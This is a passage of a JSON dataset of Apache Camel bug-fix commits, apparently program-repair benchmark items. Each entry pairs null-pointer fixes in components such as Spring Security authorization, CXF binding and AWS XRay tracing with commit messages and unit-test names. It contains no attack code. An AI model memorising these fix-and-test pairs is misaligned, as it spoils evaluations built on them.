body) {\n+            return body.split(\",\");\n+        }\n+    }\n+\n+}\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/b3763ddc378149d7cd995a7ed66543264f5b7e03/camel-core/src/test/java/org/apache/camel/processor/RecipientListBeanTest.java",
                "sha": "c2f3be85fcf8801e0c9080737f9742246157bf30",
                "status": "added"
            }
        ],
        "message": "Fixed potential NPE with enricher where the source did not return an exchange.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@809819 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/3ad57f662419a815a259c6f0bf3d8855caba56c8",
        "patched_files": [
            "PollEnricher.java",
            "Enricher.java",
            "ExpressionSubElementDefinition.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "RecipientListBeanTest.java",
            "EnricherTest.java",
            "PollEnricherTest.java"
        ]
    },
    "camel_b5ab252": {
        "bug_id": "camel_b5ab252",
        "commit": "https://github.com/apache/camel/commit/b5ab252e248f4667db1c00a1c17655cc5cb87840",
        "file": [
            {
                "additions": 10,
                "blob_url": "https://github.com/apache/camel/blob/b5ab252e248f4667db1c00a1c17655cc5cb87840/components/camel-spring-security/src/main/java/org/apache/camel/component/spring/security/SpringSecurityAuthorizationPolicy.java",
                "changes": 15,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-spring-security/src/main/java/org/apache/camel/component/spring/security/SpringSecurityAuthorizationPolicy.java?ref=b5ab252e248f4667db1c00a1c17655cc5cb87840",
                "deletions": 5,
                "filename": "components/camel-spring-security/src/main/java/org/apache/camel/component/spring/security/SpringSecurityAuthorizationPolicy.java",
                "patch": "@@ -59,8 +59,14 @@ protected void beforeProcess(Exchange exchange) throws Exception {\n         ConfigAttributeDefinition attributes = accessPolicy.getConfigAttributeDefinition();\n         \n         try {\n+            Authentication authToken = getAuthentication(exchange);\n+            if (authToken == null) {\n+                CamelAuthorizationException authorizationException =\n+                    new CamelAuthorizationException(\"Cannot find the Authentication instance.\", exchange);\n+                throw authorizationException;\n+            }\n             \n-            Authentication authenticated = authenticateIfRequired(getAuthentication(exchange));\n+            Authentication authenticated = authenticateIfRequired(authToken);\n             \n             // Attempt authorization with exchange\n             try {\n@@ -75,7 +81,7 @@ protected void beforeProcess(Exchange exchange) throws Exception {\n             \n         } catch (SpringSecurityException exception) {\n             CamelAuthorizationException authorizationException =\n-                new CamelAuthorizationException(\"Cannot access the below process\", exchange, exception);\n+                new CamelAuthorizationException(\"Cannot access the processor which has been protected.\", exchange, exception);\n             throw authorizationException;\n         }\n     }\n@@ -88,8 +94,7 @@ protected Authentication getAuthentication(Exchange exchange) {\n             if (LOG.isDebugEnabled()) {\n                 LOG.debug(\"Get the authentication from SecurityContextHolder\");\n             }\n-        }\n-        \n+        }        \n         return answer;\n     }\n \n@@ -114,7 +119,7 @@ public void afterPropertiesSet() throws Exception {\n     }\n     \n     private Authentication authenticateIfRequired(Authentication authentication) {\n-        \n+                    \n         if (authentication.isAuthenticated() && !alwaysReauthenticate) {\n             if (LOG.isDebugEnabled()) {\n                 LOG.debug(\"Previously Authenticated: \" + authentication);",
                "raw_url": "https://github.com/apache/camel/raw/b5ab252e248f4667db1c00a1c17655cc5cb87840/components/camel-spring-security/src/main/java/org/apache/camel/component/spring/security/SpringSecurityAuthorizationPolicy.java",
                "sha": "2e46cca5db72d653318f3d4ca9800cbe7bcef840",
                "status": "modified"
            }
        ],
        "message": "CAMEL-2643 Using CamelAuthorizationException to avoid the NPE of Authentication\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@933901 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/3bcac692db892de42622188c30d0ab1d157bc009",
        "patched_files": [
            "SpringSecurityAuthorizationPolicy.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "SpringSecurityAuthorizationPolicyTest.java"
        ]
    },
    "camel_b9d82f4": {
        "bug_id": "camel_b9d82f4",
        "commit": "https://github.com/apache/camel/commit/b9d82f4d07bf7a3327ec8f223bcb0bc0d483f130",
        "file": [
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/b9d82f4d07bf7a3327ec8f223bcb0bc0d483f130/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java?ref=b9d82f4d07bf7a3327ec8f223bcb0bc0d483f130",
                "deletions": 3,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "patch": "@@ -548,12 +548,15 @@ protected void propagateHeadersFromCxfToCamel(Message cxfMessage,\n                             } else {\n                                 evalue = values;\n                             }\n-                        } else {\n+                        } else if (values.size() == 1) {\n                             evalue = values.get(0);\n+                        } else {\n+                            evalue = null;\n+                        }\n+                        if (evalue != null) {\n+                            camelHeaders.put(entry.getKey(), evalue);\n                         }\n-                        camelHeaders.put(entry.getKey(), evalue);\n                     }\n-                    \n                 }\n             }\n         }",
                "raw_url": "https://github.com/apache/camel/raw/b9d82f4d07bf7a3327ec8f223bcb0bc0d483f130/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "sha": "fa8563561aad4e4dc7e57142292d3bb2b3cb2cfe",
                "status": "modified"
            }
        ],
        "message": "CAMEL-9282: Avoid NPE/IndexOutOfBounds in camel-cxf.",
        "parent": "https://github.com/apache/camel/commit/54cd88f5540de3cf934e9fd07822a070a76752b6",
        "patched_files": [
            "DefaultCxfBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCxfBindingTest.java"
        ]
    },
    "camel_ba05e02": {
        "bug_id": "camel_ba05e02",
        "commit": "https://github.com/apache/camel/commit/ba05e0201fdf4164c71441029adf5e0c5642642d",
        "file": [
            {
                "additions": 25,
                "blob_url": "https://github.com/apache/camel/blob/ba05e0201fdf4164c71441029adf5e0c5642642d/components/camel-aws-xray/src/main/docs/aws-xray.adoc",
                "changes": 28,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-aws-xray/src/main/docs/aws-xray.adoc?ref=ba05e0201fdf4164c71441029adf5e0c5642642d",
                "deletions": 3,
                "filename": "components/camel-aws-xray/src/main/docs/aws-xray.adoc",
                "patch": "@@ -1,7 +1,7 @@\n [[AWSXRay-AWSXRayComponent]]\n ## AWS XRay Component\n \n-*Available as of Camel 2.20*\n+*Available as of Camel 2.21*\n \n The camel-aws-xray component is used for tracing and timing incoming and outgoing Camel messages using https://aws.amazon.com/de/xray/[AWS XRay].\n \n@@ -20,7 +20,7 @@ To include both, AWS XRay and Camel, dependencies use the following Maven import\n       <dependency>\n         <groupId>com.amazonaws</groupId>\n         <artifactId>aws-xray-recorder-sdk-bom</artifactId>\n-        <version>1.2.0</version>\n+        <version>1.3.1</version>\n         <type>pom</type>\n         <scope>import</scope>\n       </dependency>\n@@ -52,9 +52,10 @@ The configuration properties for the AWS XRay tracer are:\n |=======================================================================\n |Option |Default |Description\n \n-|excludePatterns |  | Sets exclude pattern(s) that will disable tracing for Camel\n+|addExcludePatterns | &nbsp; | Sets exclude pattern(s) that will disable tracing for Camel\n messages that matches the pattern. The content is a Set<String> where the key is a pattern matching routeId's. The pattern\n uses the rules from Intercept.\n+|setTracingStrategy | NoopTracingStrategy | Allows a custom Camel `InterceptStrategy` to be provided in order to track invoked processor definitions like `BeanDefinition` or `ProcessDefinition`. `TraceAnnotatedTracingStrategy` will track any classes invoked via `.bean(...)` or `.process(...)` that contain a `@XRayTrace` annotation at class level.\n \n |=======================================================================\n \n@@ -88,6 +89,27 @@ AWS XRay tracer bean. Camel will automatically discover and use it.\n   </bean>\n ---------------------------------------------------------------------------------------------------------\n \n+In case of the default `NoopTracingStrategy` only the creation and deletion of exchanges is tracked but not the invocation of certain beans or EIP patterns.\n+\n+#### Tracking of comprehensive route execution\n+\n+In order to track the execution of an exchange among multiple routes, on exchange creation a unique trace ID is generated and stored in the headers if no corresponding value was yet available. This trace ID is copied over to new exchanges in order to keep a consistent view of the processed exchange.\n+\n+As AWS XRay traces work on a thread-local basis the current sub/segment should be copied over to the new thread and set as explained in https://docs.aws.amazon.com/xray/latest/devguide/xray-sdk-java-multithreading.html[in the AWS XRay documentation]. The Camel AWS XRay component therefore provides an additional header field that the component will use in order to set the passed AWS XRay `Entity` to the new thread and thus keep the tracked data to the route rather than exposing a new segment which seems uncorrelated with any of the executed routes.\n+\n+The component will use the following constants found in the headers of the exchange:\n+\n+[width=\"100%\",cols=\"30%,70%\",options=\"header\",]\n+|=======================================================================\n+|Header |Description\n+\n+| Camel-AWS-XRay-Trace-ID | Contains a reference to the AWS XRay `TraceID` object to provide a comprehensive view of the invoked routes\n+| Camel-AWS-XRay-Trace-Entity | Contains a reference to the actual AWS XRay `Segment` or `Subsegment` which is copied over to the new thread. This header should be set in case a new thread is spawned and the performed tasks should be exposed as part of the executed route instead of creating a new unrelated segment.\n+\n+|=======================================================================\n+\n+Note that the AWS XRay `Entity` (i.e., `Segment` and `Subsegment`) are not serializable and therefore should not get passed to other JVM processes.\n+\n ### Example\n \n You can find an example demonstrating the way to configure AWS XRay tracing within the tests accompanying this project.\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/ba05e0201fdf4164c71441029adf5e0c5642642d/components/camel-aws-xray/src/main/docs/aws-xray.adoc",
                "sha": "e980c3ba5002b1228473ebe3d83660472d159ed6",
                "status": "modified"
            },
            {
                "additions": 12,
                "blob_url": "https://github.com/apache/camel/blob/ba05e0201fdf4164c71441029adf5e0c5642642d/components/camel-aws-xray/src/main/java/org/apache/camel/component/aws/xray/TraceAnnotatedTracingStrategy.java",
                "changes": 17,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-aws-xray/src/main/java/org/apache/camel/component/aws/xray/TraceAnnotatedTracingStrategy.java?ref=ba05e0201fdf4164c71441029adf5e0c5642642d",
                "deletions": 5,
                "filename": "components/camel-aws-xray/src/main/java/org/apache/camel/component/aws/xray/TraceAnnotatedTracingStrategy.java",
                "patch": "@@ -50,15 +50,22 @@ public Processor wrapProcessorInInterceptors(CamelContext camelContext,\n \n         if (processorDefinition instanceof BeanDefinition) {\n             BeanProcessor beanProcessor = (BeanProcessor) nextTarget;\n-            processorClass = beanProcessor.getBean().getClass();\n+            if (null != beanProcessor && null != beanProcessor.getBean()) {\n+                processorClass = beanProcessor.getBean().getClass();\n+            }\n         } else if (processorDefinition instanceof ProcessDefinition) {\n             DelegateSyncProcessor syncProcessor = (DelegateSyncProcessor) nextTarget;\n-            processorClass = syncProcessor.getProcessor().getClass();\n+            if (null != syncProcessor && null != syncProcessor.getProcessor()) {\n+                processorClass = syncProcessor.getProcessor().getClass();\n+            }\n         }\n \n-        if (!processorClass.isAnnotationPresent(XRayTrace.class)) {\n-            LOG.trace(\"{} does not contain an @Trace annotation. Skipping interception\",\n-                processorClass.getSimpleName());\n+        if (processorClass == null) {\n+            LOG.trace(\"Could not identify processor class on target processor {}\", target);\n+            return new DelegateAsyncProcessor(target);\n+        } else if (!processorClass.isAnnotationPresent(XRayTrace.class)) {\n+            LOG.trace(\"{} does not contain an @XRayTrace annotation. Skipping interception\",\n+                    processorClass.getSimpleName());\n             return new DelegateAsyncProcessor(target);\n         }\n ",
                "raw_url": "https://github.com/apache/camel/raw/ba05e0201fdf4164c71441029adf5e0c5642642d/components/camel-aws-xray/src/main/java/org/apache/camel/component/aws/xray/TraceAnnotatedTracingStrategy.java",
                "sha": "fe327714044425ab09fa1945d1dd601b9292f3ce",
                "status": "modified"
            },
            {
                "additions": 23,
                "blob_url": "https://github.com/apache/camel/blob/ba05e0201fdf4164c71441029adf5e0c5642642d/components/camel-aws-xray/src/main/java/org/apache/camel/component/aws/xray/XRayTracer.java",
                "changes": 23,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-aws-xray/src/main/java/org/apache/camel/component/aws/xray/XRayTracer.java?ref=ba05e0201fdf4164c71441029adf5e0c5642642d",
                "deletions": 0,
                "filename": "components/camel-aws-xray/src/main/java/org/apache/camel/component/aws/xray/XRayTracer.java",
                "patch": "@@ -21,6 +21,8 @@\n import java.util.*;\n \n import com.amazonaws.xray.AWSXRay;\n+import com.amazonaws.xray.AWSXRayRecorder;\n+import com.amazonaws.xray.entities.Entity;\n import com.amazonaws.xray.entities.Segment;\n import com.amazonaws.xray.entities.Subsegment;\n import com.amazonaws.xray.entities.TraceID;\n@@ -66,6 +68,8 @@\n \n     /** Header value kept in the message of the exchange **/\n     public static final String XRAY_TRACE_ID = \"Camel-AWS-XRay-Trace-ID\";\n+    // Note that the Entity itself is not serializable, so don't share this object among different VMs!\n+    public static final String XRAY_TRACE_ENTITY = \"Camel-AWS-XRay-Trace-Entity\";\n \n     private static final Logger LOG = LoggerFactory.getLogger(MethodHandles.lookup().lookupClass());\n \n@@ -353,6 +357,25 @@ public void onExchangeBegin(Route route, Exchange exchange) {\n                 exchange.getIn().setHeader(XRAY_TRACE_ID, traceID.toString());\n             }\n \n+            // copy over any available trace entity (i.e. Segment) from the old thread to the new one\n+            // according to AWS XRay documentation on multithreading:\n+\n+            // https://docs.aws.amazon.com/xray/latest/devguide/xray-sdk-java-multithreading.html\n+            //\n+            // > If you use multiple threads to handle incoming requests, you can pass the current segment or subsegment\n+            // > to the new thread and provide it to the global recorder. This ensures that the information recorded\n+            // > within the new thread is associated with the same segment as the rest of the information recorded about\n+            // > that request.\n+            Entity entity = null;\n+            if (exchange.getIn().getHeaders().containsKey(XRAY_TRACE_ENTITY)) {\n+                entity = exchange.getIn().getHeader(XRAY_TRACE_ENTITY, Entity.class);\n+            }\n+\n+            if (null != entity) {\n+                AWSXRayRecorder recorder = AWSXRay.getGlobalRecorder();\n+                recorder.setTraceEntity(entity);\n+            }\n+\n             SegmentDecorator sd = getSegmentDecorator(route.getEndpoint());\n             if (!AWSXRay.getCurrentSegmentOptional().isPresent()) {\n                 Segment segment = AWSXRay.beginSegment(sanitizeName(route.getId()));",
                "raw_url": "https://github.com/apache/camel/raw/ba05e0201fdf4164c71441029adf5e0c5642642d/components/camel-aws-xray/src/main/java/org/apache/camel/component/aws/xray/XRayTracer.java",
                "sha": "128d964ffcd7eadca1d26116497554a1b1683440",
                "status": "modified"
            },
            {
                "additions": 99,
                "blob_url": "https://github.com/apache/camel/blob/ba05e0201fdf4164c71441029adf5e0c5642642d/components/camel-aws-xray/src/test/java/org/apache/camel/component/aws/xray/ComprehensiveTrackingTest.java",
                "changes": 99,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-aws-xray/src/test/java/org/apache/camel/component/aws/xray/ComprehensiveTrackingTest.java?ref=ba05e0201fdf4164c71441029adf5e0c5642642d",
                "deletions": 0,
                "filename": "components/camel-aws-xray/src/test/java/org/apache/camel/component/aws/xray/ComprehensiveTrackingTest.java",
                "patch": "@@ -0,0 +1,99 @@\n+package org.apache.camel.component.aws.xray;\n+\n+import org.apache.camel.Handler;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.aws.xray.bean.SomeBean;\n+import org.junit.Test;\n+\n+import static org.hamcrest.CoreMatchers.equalTo;\n+import static org.hamcrest.CoreMatchers.is;\n+\n+public class ComprehensiveTrackingTest extends CamelAwsXRayTestSupport {\n+\n+    private InvokeChecker invokeChecker = new InvokeChecker();\n+\n+    public ComprehensiveTrackingTest() {\n+        super(\n+                TestDataBuilder.createTrace().inRandomOrder()\n+                        .withSegment(TestDataBuilder.createSegment(\"start\")\n+                                .withSubsegment(TestDataBuilder.createSubsegment(\"direct:a\")\n+                                        .withSubsegment(TestDataBuilder.createSubsegment(\"a\")\n+                                                .withSubsegment(TestDataBuilder.createSubsegment(\"seda:b\"))\n+                                                .withSubsegment(TestDataBuilder.createSubsegment(\"seda:c\"))\n+                                                // note that the subsegment name matches the routeId\n+                                                .withSubsegment(TestDataBuilder.createSubsegment(\"test\"))\n+                                                // no tracing of the invoke checker bean as it wasn't annotated with\n+                                                // @XRayTrace\n+                                        )\n+                                )\n+                        )\n+                        .withSegment(TestDataBuilder.createSegment(\"b\"))\n+                        .withSegment(TestDataBuilder.createSegment(\"c\")\n+                                // disabled by the LogSegmentDecorator (-> .to(\"log:...\");\n+                                //.withSubsegment(TestDataBuilder.createSubsegment(\"log:test\"))\n+                        )\n+                        .withSegment(TestDataBuilder.createSegment(\"d\"))\n+                        // note no test-segment here!\n+        );\n+    }\n+\n+    @Test\n+    public void testRoute() throws Exception {\n+        template.requestBody(\"direct:start\", \"Hello\");\n+\n+        verify();\n+\n+        assertThat(invokeChecker.gotInvoked(), is(equalTo(true)));\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"direct:start\").routeId(\"start\")\n+                        .wireTap(\"seda:d\")\n+                        .to(\"direct:a\");\n+\n+                from(\"direct:a\").routeId(\"a\")\n+                        .log(\"routing at ${routeId}\")\n+                        .to(\"seda:b\")\n+                        .delay(2000)\n+                        .bean(SomeBean.class)\n+                        .to(\"seda:c\")\n+                        .log(\"End of routing\");\n+\n+                from(\"seda:b\").routeId(\"b\")\n+                        .log(\"routing at ${routeId}\")\n+                        .delay(simple(\"${random(1000,2000)}\"));\n+\n+                from(\"seda:c\").routeId(\"c\")\n+                        .to(\"log:test\")\n+                        .delay(simple(\"${random(0,100)}\"));\n+\n+                from(\"seda:d\").routeId(\"d\")\n+                        .log(\"routing at ${routeId}\")\n+                        .delay(simple(\"${random(10,50)}\"));\n+\n+                from(\"seda:test\").routeId(\"test\")\n+                        .log(\"Async invoked route ${routeId} with body: ${body}\")\n+                        .bean(invokeChecker)\n+                        .delay(simple(\"${random(10,50)}\"));\n+            }\n+        };\n+    }\n+\n+    public static class InvokeChecker {\n+\n+        private boolean invoked = false;\n+\n+        @Handler\n+        public void invoke() {\n+            this.invoked = true;\n+        }\n+\n+        boolean gotInvoked() {\n+            return this.invoked;\n+        }\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/ba05e0201fdf4164c71441029adf5e0c5642642d/components/camel-aws-xray/src/test/java/org/apache/camel/component/aws/xray/ComprehensiveTrackingTest.java",
                "sha": "1ff699274b2637ee91aee5da6849cb65d6487f42",
                "status": "added"
            },
            {
                "additions": 33,
                "blob_url": "https://github.com/apache/camel/blob/ba05e0201fdf4164c71441029adf5e0c5642642d/components/camel-aws-xray/src/test/java/org/apache/camel/component/aws/xray/bean/SomeBean.java",
                "changes": 33,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-aws-xray/src/test/java/org/apache/camel/component/aws/xray/bean/SomeBean.java?ref=ba05e0201fdf4164c71441029adf5e0c5642642d",
                "deletions": 0,
                "filename": "components/camel-aws-xray/src/test/java/org/apache/camel/component/aws/xray/bean/SomeBean.java",
                "patch": "@@ -0,0 +1,33 @@\n+package org.apache.camel.component.aws.xray.bean;\n+\n+import com.amazonaws.xray.AWSXRay;\n+import org.apache.camel.*;\n+import org.apache.camel.component.aws.xray.XRayTrace;\n+import org.apache.camel.component.aws.xray.XRayTracer;\n+\n+import java.util.HashMap;\n+import java.util.Map;\n+\n+@XRayTrace\n+public class SomeBean {\n+\n+    @Handler\n+    public void doSomething(@Headers Map<String, Object> headers, CamelContext context) {\n+\n+        ProducerTemplate template = context.createProducerTemplate();\n+        String body = \"New exchange test\";\n+\n+        Endpoint testEndpoint = template.getCamelContext().getEndpoint(\"seda:test\");\n+        Exchange exchange = testEndpoint.createExchange(ExchangePattern.InOnly);\n+        exchange.getIn().setBody(body);\n+\n+        Map<String, Object> newHeaders = new HashMap<>();\n+        // as we create a completely new exchange, this exchange has no trace ID yet specified and would result in a new\n+        // trace ID being generated which would present a flawed view if viewed in the AWS XRay console\n+        newHeaders.put(XRayTracer.XRAY_TRACE_ID, headers.get(XRayTracer.XRAY_TRACE_ID));\n+        // store the current AWS XRay trace entity (= segment or subsegment) into the headers\n+        newHeaders.put(XRayTracer.XRAY_TRACE_ENTITY, AWSXRay.getGlobalRecorder().getTraceEntity());\n+        exchange.getIn().setHeaders(newHeaders);\n+        template.asyncSend(testEndpoint, exchange);\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/ba05e0201fdf4164c71441029adf5e0c5642642d/components/camel-aws-xray/src/test/java/org/apache/camel/component/aws/xray/bean/SomeBean.java",
                "sha": "684f612724b0514c12567125c21ae57703144c8a",
                "status": "added"
            }
        ],
        "message": "Updated documentation of the AWS XRay component\nAdded support for a more comprehensive view of sub/segments by copying over the AWS XRay entity (if provided in the exchange headers) to the new thread. Instead of creating a new segment for the seda route the invoked route will be added as subsegment to the invoking route. This is especially useful if some Amazon services (like the S3 upload) are used, which may occur in its own thread.\nFixed some possible NPEs",
        "parent": "https://github.com/apache/camel/commit/95c959e072a408be354667128c9f9a94d1773d27",
        "patched_files": [
            "aws-xray.java",
            "SomeBean.java",
            "TraceAnnotatedTracingStrategy.java",
            "XRayTracer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ComprehensiveTrackingTest.java"
        ]
    },
    "camel_bb6f838": {
        "bug_id": "camel_bb6f838",
        "commit": "https://github.com/apache/camel/commit/bb6f83806ba5d17df32f1b31cbad8c7c47f870c9",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/bb6f83806ba5d17df32f1b31cbad8c7c47f870c9/components/camel-test/src/main/java/org/apache/camel/test/junit4/CamelTestSupport.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-test/src/main/java/org/apache/camel/test/junit4/CamelTestSupport.java?ref=bb6f83806ba5d17df32f1b31cbad8c7c47f870c9",
                "deletions": 2,
                "filename": "components/camel-test/src/main/java/org/apache/camel/test/junit4/CamelTestSupport.java",
                "patch": "@@ -410,7 +410,7 @@ private boolean isRouteCoverageEnabled() {\n \n     @After\n     public void tearDown() throws Exception {\n-        long time = watch.stop();\n+        long time = watch.taken();\n \n         log.info(\"********************************************************************************\");\n         log.info(\"Testing done: \" + getTestMethodName() + \"(\" + getClass().getName() + \")\");\n@@ -422,7 +422,7 @@ public void tearDown() throws Exception {\n             String dir = \"target/camel-route-coverage\";\n             String name = className + \"-\" + getTestMethodName() + \".xml\";\n \n-            ManagedCamelContextMBean managedCamelContext = context.getManagedCamelContext();\n+            ManagedCamelContextMBean managedCamelContext = context != null ? context.getManagedCamelContext() : null;\n             if (managedCamelContext == null) {\n                 log.warn(\"Cannot dump route coverage to file as JMX is not enabled. Override useJmx() method to enable JMX in the unit test classes.\");\n             } else {",
                "raw_url": "https://github.com/apache/camel/raw/bb6f83806ba5d17df32f1b31cbad8c7c47f870c9/components/camel-test/src/main/java/org/apache/camel/test/junit4/CamelTestSupport.java",
                "sha": "3b9df0284ffbb8e31c33de01f20ee951b0a5cedb",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE",
        "parent": "https://github.com/apache/camel/commit/0cce3785ce0b7a9e87d0abb08ebfc8290e102264",
        "patched_files": [
            "CamelTestSupport.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CamelTestSupportTest.java"
        ]
    },
    "camel_be51f53": {
        "bug_id": "camel_be51f53",
        "commit": "https://github.com/apache/camel/commit/be51f53e63b26759a524df1ab12d38343d97cad9",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/be51f53e63b26759a524df1ab12d38343d97cad9/camel-core/src/main/java/org/apache/camel/impl/SerializationDataFormat.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/SerializationDataFormat.java?ref=be51f53e63b26759a524df1ab12d38343d97cad9",
                "deletions": 4,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/SerializationDataFormat.java",
                "patch": "@@ -34,8 +34,8 @@\n  */\n public class SerializationDataFormat implements DataFormat {\n \n-    public void marshal(Exchange exchange, Object graph, OutputStream stream) throws IOException {\n-        ObjectOutput out = ExchangeHelper.convertToType(exchange, ObjectOutput.class, stream);\n+    public void marshal(Exchange exchange, Object graph, OutputStream stream) throws Exception {\n+        ObjectOutput out = ExchangeHelper.convertToMandatoryType(exchange, ObjectOutput.class, stream);\n         try {\n             out.writeObject(graph);\n         } finally {\n@@ -48,8 +48,8 @@ public void marshal(Exchange exchange, Object graph, OutputStream stream) throws\n         }\n     }\n \n-    public Object unmarshal(Exchange exchange, InputStream stream) throws IOException, ClassNotFoundException {\n-        ObjectInput in = ExchangeHelper.convertToType(exchange, ObjectInput.class, stream);\n+    public Object unmarshal(Exchange exchange, InputStream stream) throws Exception {\n+        ObjectInput in = ExchangeHelper.convertToMandatoryType(exchange, ObjectInput.class, stream);\n         try {\n             return in.readObject();\n         } finally {",
                "raw_url": "https://github.com/apache/camel/raw/be51f53e63b26759a524df1ab12d38343d97cad9/camel-core/src/main/java/org/apache/camel/impl/SerializationDataFormat.java",
                "sha": "8d33d62069a13cf8eb233c0ba8e9053e1ba2a2ba",
                "status": "modified"
            },
            {
                "additions": 20,
                "blob_url": "https://github.com/apache/camel/blob/be51f53e63b26759a524df1ab12d38343d97cad9/camel-core/src/test/java/org/apache/camel/processor/DataFormatTest.java",
                "changes": 20,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/DataFormatTest.java?ref=be51f53e63b26759a524df1ab12d38343d97cad9",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/DataFormatTest.java",
                "patch": "@@ -16,11 +16,14 @@\n  */\n package org.apache.camel.processor;\n \n+import java.io.NotSerializableException;\n import java.io.Serializable;\n \n+import org.apache.camel.CamelExecutionException;\n import org.apache.camel.ContextTestSupport;\n import org.apache.camel.builder.RouteBuilder;\n import org.apache.camel.component.mock.MockEndpoint;\n+\n import static org.apache.camel.util.ObjectHelper.equal;\n \n /**\n@@ -41,6 +44,15 @@ public void testMarshalThenUnmarshalBean() throws Exception {\n         resultEndpoint.assertIsSatisfied();\n     }\n \n+    public void testMarshalNonSerializableBean() throws Exception {\n+        MyNonSerializableBean bean = new MyNonSerializableBean(\"James\");\n+        try {\n+            template.sendBody(\"direct:start\", bean);\n+            fail(\"Should throw exception\");\n+        } catch (CamelExecutionException e) {\n+            assertIsInstanceOf(NotSerializableException.class, e.getCause());\n+        }\n+    }\n \n     protected RouteBuilder createRouteBuilder() {\n         return new RouteBuilder() {\n@@ -70,4 +82,12 @@ public int hashCode() {\n         }\n     }\n \n+    protected static class MyNonSerializableBean {\n+        private String name;\n+\n+        public MyNonSerializableBean(String name) {\n+            this.name = name;\n+        }\n+    }\n+\n }\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/be51f53e63b26759a524df1ab12d38343d97cad9/camel-core/src/test/java/org/apache/camel/processor/DataFormatTest.java",
                "sha": "ac1e06591d00a5e4d179c798c097de21dbc79b02",
                "status": "modified"
            }
        ],
        "message": "CAMEL-4449: Fixed potential NPE in Serialization data format\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1171947 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/35eaad3d0a348546f2653b7030f07af35bbb7b4e",
        "patched_files": [
            "DataFormat.java",
            "SerializationDataFormat.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DataFormatTest.java"
        ]
    },
    "camel_bfdee32": {
        "bug_id": "camel_bfdee32",
        "commit": "https://github.com/apache/camel/commit/bfdee323b091ab04a873fa8c95d18fdace3bf965",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/bfdee323b091ab04a873fa8c95d18fdace3bf965/camel-core/src/main/java/org/apache/camel/impl/DefaultConsumerTemplate.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultConsumerTemplate.java?ref=bfdee323b091ab04a873fa8c95d18fdace3bf965",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultConsumerTemplate.java",
                "patch": "@@ -226,6 +226,10 @@ protected Object extractResultBody(Exchange result) {\n \n     private static void doneUoW(Exchange exchange) {\n         try {\n+            // The receiveBody method will get a null exchange\n+            if (exchange == null) {\n+                return;\n+            }\n             if (exchange.getUnitOfWork() == null) {\n                 // handover completions and done them manually to ensure they are being executed\n                 List<Synchronization> synchronizations = exchange.handoverCompletions();",
                "raw_url": "https://github.com/apache/camel/raw/bfdee323b091ab04a873fa8c95d18fdace3bf965/camel-core/src/main/java/org/apache/camel/impl/DefaultConsumerTemplate.java",
                "sha": "86be97ad7c4269701e9711d8d2a4d4a757fb28f7",
                "status": "modified"
            }
        ],
        "message": "CAMEL-3252 Fixed the NPE log fo the DefaultConsumerTemplate\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1024201 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/ef7b6bbada220f65a86fcca7f2f4ba44f548ec41",
        "patched_files": [
            "DefaultConsumerTemplate.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultConsumerTemplateTest.java"
        ]
    },
    "camel_c1a40c3": {
        "bug_id": "camel_c1a40c3",
        "commit": "https://github.com/apache/camel/commit/c1a40c3d0367300e098d7cf4518a15d2dd63f46c",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/c1a40c3d0367300e098d7cf4518a15d2dd63f46c/camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultTraceEventMessage.java",
                "changes": 20,
